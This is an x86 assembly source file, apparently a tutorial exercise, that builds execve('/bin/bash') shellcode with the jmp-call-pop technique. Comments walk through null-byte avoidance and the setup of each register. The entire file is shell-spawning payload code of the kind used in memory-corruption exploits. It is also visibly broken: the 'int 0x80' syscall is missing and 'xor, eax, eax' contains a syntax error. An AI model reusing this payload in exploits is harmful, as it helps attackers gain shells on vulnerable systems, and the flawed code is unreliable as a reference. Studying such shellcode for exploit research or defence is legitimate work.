; Filename: jmp-call-pop.asm
; Author: Brandon Dennis

; execve
; execve takes 3 arguments
; 1: filename: EX /bin/bash, 0x0
; 2: arguments for the executable(1st arg should be the filename then 2nd arg should be null or 0x0000)
; 3: envp is used for env settings, we can leave this as null: EX 0x0000

; 


global _start

section .text

_start:
	; we issue our jmp here to get to call_shellcode
	jmp short call_shellcode
	
	
shellcode:

	pop esi ; we now pop the message label address off the stack into esi
	; this is done since all registers are going to be used when issuing the syscall
	
	; we need to change the A in the message to be null at runtime so it terminates the string
	xor ebx, ebx ; this will 0 out the ebx register
	mov byte [esi +9], bl ; we set the 9th position in the message string to bl which is 0
	
	mov dword [esi +10], esi ; we are now wanting to change BBBB to be the address of the string /bin/bash
	; sincethe first B is right after the A at position 9 we now use 10
	
	mov dword [esi +14], ebx ; we need all C's to be null. Since we xor'd ebx already we can use that
	; we move this to 14 bytes now since there were 4 B's
	
	lea ebx, [esi] ; this will load the address of /bin/bash into ebx as the first arg
	lea ecx, [esi +10] ; this will load the address of /bin/bash + the nulls where the C's are
	lea edx, [esi +14] ; this will load the address of the nulls
	
	xor, eax, eax ; this 0's out the register
	mov al, 0xb ; this will load the syscall # 11
	
	

call_shellcode:
	call shellcode ; here the address of the message label below is pushed onto the stack
	message db "/bin/bashABBBBCCCC"

